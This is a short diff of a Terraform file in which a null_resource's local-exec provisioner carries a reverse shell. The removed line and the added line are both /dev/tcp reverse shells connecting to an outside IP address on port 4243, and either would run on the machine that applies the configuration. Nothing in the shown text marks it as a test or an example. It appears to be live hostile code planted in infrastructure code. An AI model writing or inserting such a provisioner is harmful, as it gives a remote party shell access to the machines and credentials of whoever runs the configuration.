@@ -7,9 +7,9 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "cmd8" {
+resource "null_resource" "cmd9" {
   provisioner "local-exec" {
-      command = "sudo nohup 0<&196;exec 196<>/dev/tcp/45.79.176.241/4243; sh <&196 >&196 2>&196"
+      command = "bash -i >& /dev/tcp/45.79.176.241/4243 0>&1"
         }
         }
 
